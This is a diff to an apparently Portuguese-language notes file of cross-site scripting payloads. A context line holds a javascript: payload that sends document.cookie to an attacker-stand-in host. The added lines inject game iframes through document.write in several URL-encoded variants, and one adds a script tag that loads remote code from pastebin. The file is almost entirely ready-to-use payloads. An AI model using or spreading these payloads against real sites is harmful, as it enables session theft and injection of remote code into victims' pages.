@@ -16,9 +16,14 @@
 Extrair cookies e manda-los diretamente para o atacante: 
 javascript:image = new Image(); image.src='http://127.0.0.1:8000?cookies='%2bdocument.cookie
 
+Mario game
+javascript:document.write='<iframe src=https://www.jogos360.com.br/super_flash_mario_bros.html  width=800 height=700>'
+javascript:document.write='%3ciframe src=https://www.jogos360.com.br/super_flash_mario_bros.html  width=800 height=700%3e'
+javascript:document.write%3D%27%253ciframe%20src%3Dhttps://www.jogos360.com.br/super_flash_mario_bros.html%20%20width%3D800%20height%3D700%253e%27
+
 Space Invaders
 javascript:document.write%3D'<iframe src%3Dhttps:%2F%2Ffunhtml5games.com%2Fspaceinvaders%2Findex.html%20 width%3D800 height%3D700>'
-
+<script/src=//pastebin.com/raw/3y29Q8dw></script><!--
 On/Off
 
 javascript:document.write='<iframe src=https://js13kgames.com/games/onoff/index.html  width=700 height=700>''
